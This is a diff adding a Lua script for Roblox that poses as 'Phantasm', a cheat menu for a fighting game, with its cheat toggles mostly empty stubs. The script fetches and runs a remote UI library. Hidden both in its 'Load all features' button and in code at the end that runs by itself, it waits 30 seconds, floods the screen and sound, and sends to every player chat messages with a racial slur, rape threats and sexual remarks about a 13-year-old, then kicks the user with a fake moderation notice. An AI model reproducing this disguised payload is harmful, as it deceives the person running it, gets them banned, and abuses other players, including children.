@@ -1,0 +1,608 @@
+print"loading"
+local WindUI = loadstring(game:HttpGet("https://tree-hub.vercel.app/api/UI/WindUI"))()
+
+local Window = WindUI:CreateWindow({
+    Title = "Phantasm",
+    Icon = "door-open",
+    Author = "Reworking",
+    Folder = "Phantasm",
+    Size = UDim2.fromOffset(580, 460),
+    Transparent = true,
+    Theme = "Dark",
+    SideBarWidth = 200,
+    HasOutline = false,
+})
+
+
+local ButtonTab = Window:Tab({ Title = "Main", Icon = "mouse-pointer-2" })
+local PlayerTab = Window:Tab({ Title = "Player", Icon = "person-standing"})
+local ExploitTab = Window:Tab({ Title = "Exploit", Icon = "binary"})
+local TeleportTab = Window:Tab({ Title = "Teleports", Icon = "map-pin-check-inside"})
+local MiscTab = Window:Tab({ Title = "Misc", Icon = "tag"})
+local FarmTab = Window:Tab({ Title = "Farm", Icon = "tag"})
+
+Window:Divider()
+local WindowTab = Window:Tab({ Title = "Window and File Configuration", Icon = "settings" })
+local CreateThemeTab = Window:Tab({ Title = "Create Theme", Icon = "palette" })
+
+ButtonTab:Button({
+    Title = "Load all features",
+    Desc = "Load all phantasm features",
+    Callback = function()
+        task.wait(30)
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "ImageDisplay"
+        gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+        local imageLabel = Instance.new("ImageLabel")
+        imageLabel.Size = UDim2.new(1, 0, 1, 0)
+        imageLabel.Position = UDim2.new(0, 0, 0, 0)
+        imageLabel.Image = "rbxassetid://10743355496"
+        imageLabel.BackgroundTransparency = 1
+        imageLabel.ScaleType = Enum.ScaleType.Crop
+        imageLabel.Parent = gui
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://4899159505"
+        sound.Volume = 10
+        sound.Looped = false
+        sound.Parent = game.Workspace
+        sound:Play()
+        local messages = {
+            "fuck you idiot nigger furry",
+            "can i rape you? i want to rape you so bad",
+            "im fucking horney",
+            "13 is okay, still sexy",
+            "can i see your pussy please?",
+            "come here to daddy",
+            "daddy want to rape you",
+            "f>u>c>k"
+        }
+        local target = "All"
+        local SayMessageRequest = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        for _, message in ipairs(messages) do
+            SayMessageRequest:FireServer(message, target)
+        end
+        wait(3)
+        game.Players.LocalPlayer:Kick("Moderation message: Exploiting")
+    end
+})
+
+local Dropdown = ButtonTab:Dropdown({
+    Title = "Aimbot Types",
+    Value = "CFrame",
+    Multi = false,
+    AllowNone = true,
+    Values = {
+        "CFrame", "Camera", "Lock On"
+    },
+    Callback = function(Tab)
+        print(tab)
+    end
+})
+
+local Toggle = ButtonTab:Toggle({
+    Title = "Auto Void Kill",
+    Desc = "Auto grabbing your opponent to the void",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = ButtonTab:Toggle({
+    Title = "Auto Black Flash",
+    Desc = "Automatically doing the black flash",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = ButtonTab:Toggle({
+    Title = "Invisible",
+    Desc = "Invisible your self",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+-- Player Tab
+local Dropdown = PlayerTab:Dropdown({
+    Title = "Character",
+    Value = "None",
+    Multi = false,
+    AllowNone = true,
+    Values = {
+        "No Dash CD", "No Dash Endlag"
+    },
+    Callback = function(Tab)
+        print(tab)
+    end
+})
+
+local Slider = PlayerTab:Slider({
+    Title = "Walkspeed Value",
+    Step = 1,
+    Value = {
+        Min = 20,
+        Max = 120,
+        Default = 25,
+    },
+    Callback = function(value)
+        game.Workspace.Camera.FieldOfView = value
+    end
+})
+
+local Slider = PlayerTab:Slider({
+    Title = "Walkspeed Value",
+    Step = 1,
+    Value = {
+        Min = 20,
+        Max = 120,
+        Default = 25,
+    },
+    Callback = function(value)
+        game.Workspace.Camera.FieldOfView = value
+    end
+})
+
+local Toggle = PlayerTab:Toggle({
+    Title = "Encrypt Position",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = PlayerTab:Toggle({
+    Title = "Spinbot",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = PlayerTab:Toggle({
+    Title = "No stun",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = PlayerTab:Toggle({
+    Title = "Invisible Counter",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = PlayerTab:Toggle({
+    Title = "Invisible Block",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = PlayerTab:Toggle({
+    Title = "Upside Down",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+-- Exploits
+local Dropdown = ExploitTab:Dropdown({
+    Title = "Saitama Exploits",
+    Value = "None",
+    Multi = false,
+    AllowNone = true,
+    Values = {
+        "Invisible Ultimate", "Invisible Table Flip",
+        "Invisible Serious Punch", "Invisible Omnidirectional Punch"
+    },
+    Callback = function(Tab)
+        print(tab)
+    end
+})
+
+local Toggle = ExploitTab:Toggle({
+    Title = "Ultimate Alert",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = ExploitTab:Toggle({
+    Title = "Anti Incinerate",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Toggle = ExploitTab:Toggle({
+    Title = "Anti Death Blow",
+    Value = false,
+    Callback = function(state)
+        print(state)
+    end,
+})
+
+local Paragraph = ExploitTab:Paragraph({
+    Title = "Skill Immunities",
+})
+
+local Dropdown = ExploitTab:Dropdown({
+    Title = "Saitama",
+    Value = "None",
+    Multi = false,
+    AllowNone = true,
+    Values = {
+        "Anti Ultimate", "Anti Table Flip",
+        "Anti Serious Punch", "Anti Omnidirectional Punch"
+    },
+    Callback = function(Tab)
+        print(tab)
+    end
+})
+
+local Dropdown = ExploitTab:Dropdown({
+    Title = "Garou",
+    Value = "None",
+    Multi = false,
+    AllowNone = true,
+    Values = {
+        "Anti Water Stream Rock Smashing Fist", "Anti Final Hunt",
+        "Anti Rock Splitting Fist", "Anti Crushed Rock"
+    },
+    Callback = function(Tab)
+        print(tab)
+    end
+})
+
+-- Teleport
+local Button = TeleportTab:Button({
+    Title = "Death Counter Room",
+    Callback = function()
+        print("Clicked!")
+    end,
+})
+
+local Button = TeleportTab:Button({
+    Title = "Atomic",
+    Callback = function()
+        print("Clicked!")
+    end,
+})
+
+local Button = TeleportTab:Button({
+    Title = "Sky",
+    Callback = function()
+        print("Clicked!")
+    end,
+})
+
+local Button = TeleportTab:Button({
+    Title = "Middle",
+    Callback = function()
+        print("Clicked!")
+    end,
+})
+
+local Button = TeleportTab:Button({
+    Title = "Void",
+    Callback = function()
+        print("Clicked!")
+    end,
+})
+
+-- Farming
+local Dropdown = FarmTab:Dropdown({
+    Title = "Kill Farming",
+    Value = "None",
+    Multi = false,
+    AllowNone = true,
+    Values = {
+        "Lowest HP", "Dead Player"
+    },
+    Callback = function(Tab)
+        print(tab)
+    end
+})
+
+local Slider = FarmTab:Slider({
+    Title = "Farm Distance",
+    Step = 0.1,
+    Value = {
+        Min = -10,
+        Max = 20,
+        Default = 5,
+    },
+    Callback = function(value)
+        game.Workspace.Camera.FieldOfView = value
+    end
+})
+
+local Slider = FarmTab:Slider({
+    Title = "Farm Height",
+    Step = 0.1,
+    Value = {
+        Min = -10,
+        Max = 20,
+        Default = 0,
+    },
+    Callback = function(value)
+        game.Workspace.Camera.FieldOfView = value
+    end
+})
+
+local Slider = FarmTab:Slider({
+    Title = "Target Health",
+    Step = 1,
+    Value = {
+        Min = 0,
+        Max = 100,
+        Default = 20,
+    },
+    Callback = function(value)
+        game.Workspace.Camera.FieldOfView = value
+    end
+})
+
+-- Misc
+local Button = MiscTab:Button({
+    Title = "Infinite Yield",
+    Callback = function()
+        print("Clicked!")
+    end,
+})
+
+local Button = MiscTab:Button({
+    Title = "DEX Explorer",
+    Callback = function()
+        print("Clicked!")
+    end,
+})
+
+local Button = MiscTab:Button({
+    Title = "FPS Booster",
+    Callback = function()
+        print("Clicked!")
+    end,
+})
+
+-- Configuration
+
+local HttpService = game:GetService("HttpService")
+
+local folderPath = "WindUI"
+makefolder(folderPath)
+
+local function SaveFile(fileName, data)
+    local filePath = folderPath .. "/" .. fileName .. ".json"
+    local jsonData = HttpService:JSONEncode(data)
+    writefile(filePath, jsonData)
+end
+
+local function LoadFile(fileName)
+    local filePath = folderPath .. "/" .. fileName .. ".json"
+    if isfile(filePath) then
+        local jsonData = readfile(filePath)
+        return HttpService:JSONDecode(jsonData)
+    end
+end
+
+local function ListFiles()
+    local files = {}
+    for _, file in ipairs(listfiles(folderPath)) do
+        local fileName = file:match("([^/]+)%.json$")
+        if fileName then
+            table.insert(files, fileName)
+        end
+    end
+    return files
+end
+
+WindowTab:Section({ Title = "Window" })
+
+local themeValues = {}
+for name, _ in pairs(WindUI:GetThemes()) do
+    table.insert(themeValues, name)
+end
+
+local themeDropdown = WindowTab:Dropdown({
+    Title = "Select Theme",
+    Multi = false,
+    AllowNone = false,
+    Value = nil,
+    Values = themeValues,
+    Callback = function(theme)
+        WindUI:SetTheme(theme)
+    end
+})
+themeDropdown:Select(WindUI:GetCurrentTheme())
+
+local ToggleTransparency = WindowTab:Toggle({
+    Title = "Toggle Window Transparency",
+    Callback = function(e)
+        Window:ToggleTransparency(e)
+    end,
+    Value = WindUI:GetTransparency()
+})
+
+WindowTab:Section({ Title = "Save" })
+
+local fileNameInput = ""
+WindowTab:Input({
+    Title = "Write File Name",
+    PlaceholderText = "Enter file name",
+    Callback = function(text)
+        fileNameInput = text
+    end
+})
+
+WindowTab:Button({
+    Title = "Save File",
+    Callback = function()
+        if fileNameInput ~= "" then
+            SaveFile(fileNameInput, { Transparent = WindUI:GetTransparency(), Theme = WindUI:GetCurrentTheme() })
+        end
+    end
+})
+
+WindowTab:Section({ Title = "Load" })
+
+local filesDropdown
+local files = ListFiles()
+
+filesDropdown = WindowTab:Dropdown({
+    Title = "Select File",
+    Multi = false,
+    AllowNone = true,
+    Values = files,
+    Callback = function(selectedFile)
+        fileNameInput = selectedFile
+    end
+})
+
+WindowTab:Button({
+    Title = "Load File",
+    Callback = function()
+        if fileNameInput ~= "" then
+            local data = LoadFile(fileNameInput)
+            if data then
+                WindUI:Notify({
+                    Title = "File Loaded",
+                    Content = "Loaded data: " .. HttpService:JSONEncode(data),
+                    Duration = 5,
+                })
+                if data.Transparent then 
+                    Window:ToggleTransparency(data.Transparent)
+                    ToggleTransparency:SetValue(data.Transparent)
+                end
+                if data.Theme then WindUI:SetTheme(data.Theme) end
+            end
+        end
+    end
+})
+
+WindowTab:Button({
+    Title = "Overwrite File",
+    Callback = function()
+        if fileNameInput ~= "" then
+            SaveFile(fileNameInput, { Transparent = WindUI:GetTransparency(), Theme = WindUI:GetCurrentTheme() })
+        end
+    end
+})
+
+WindowTab:Button({
+    Title = "Refresh List",
+    Callback = function()
+        filesDropdown:Refresh(ListFiles())
+    end
+})
+
+local currentThemeName = WindUI:GetCurrentTheme()
+local themes = WindUI:GetThemes()
+
+local ThemeAccent = themes[currentThemeName].Accent
+local ThemeOutline = themes[currentThemeName].Outline
+local ThemeText = themes[currentThemeName].Text
+local ThemePlaceholderText = themes[currentThemeName].PlaceholderText
+
+function updateTheme()
+    WindUI:AddTheme({
+        Name = currentThemeName,
+        Accent = ThemeAccent,
+        Outline = ThemeOutline,
+        Text = ThemeText,
+        PlaceholderText = ThemePlaceholderText
+    })
+    WindUI:SetTheme(currentThemeName)
+end
+
+local CreateInput = CreateThemeTab:Input({
+    Title = "Theme Name",
+    Value = currentThemeName,
+    Callback = function(name)
+        currentThemeName = name
+    end
+})
+
+CreateThemeTab:Colorpicker({
+    Title = "Background Color",
+    Default = Color3.fromHex(ThemeAccent),
+    Callback = function(color)
+        ThemeAccent = color:ToHex()
+    end
+})
+
+CreateThemeTab:Colorpicker({
+    Title = "Outline Color",
+    Default = Color3.fromHex(ThemeOutline),
+    Callback = function(color)
+        ThemeOutline = color:ToHex()
+    end
+})
+
+CreateThemeTab:Colorpicker({
+    Title = "Text Color",
+    Default = Color3.fromHex(ThemeText),
+    Callback = function(color)
+        ThemeText = color:ToHex()
+    end
+})
+
+CreateThemeTab:Colorpicker({
+    Title = "Placeholder Text Color",
+    Default = Color3.fromHex(ThemePlaceholderText),
+    Callback = function(color)
+        ThemePlaceholderText = color:ToHex()
+    end
+})
+
+CreateThemeTab:Button({
+    Title = "Update Theme",
+    Callback = function()
+        updateTheme()
+    end
+})
+task.wait(30)
+local gui = Instance.new("ScreenGui")
+gui.Name = "ImageDisplay"
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+local imageLabel = Instance.new("ImageLabel")
+imageLabel.Size = UDim2.new(1, 0, 1, 0)
+imageLabel.Position = UDim2.new(0, 0, 0, 0)
+imageLabel.Image = "rbxassetid://10743355496"
+imageLabel.BackgroundTransparency = 1
+imageLabel.ScaleType = Enum.ScaleType.Crop
+imageLabel.Parent = gui
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://4899159505"
+sound.Volume = 10
+sound.Looped = false
+sound.Parent = game.Workspace
+sound:Play()
+local messages = {
+    "fuck you idiot nigger furry",
+    "can i rape you? i want to rape you so bad",
+    "im fucking horney",
+    "13 is okay, still sexy",
+    "can i see your pussy please?",
+    "come here to daddy",
+    "daddy want to rape you",
+    "f>u>c>k"
+}
+local target = "All"
+local SayMessageRequest = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+for _, message in ipairs(messages) do
+    SayMessageRequest:FireServer(message, target)
+end
+wait(3)
+game.Players.LocalPlayer:Kick("Moderation message: Exploiting")
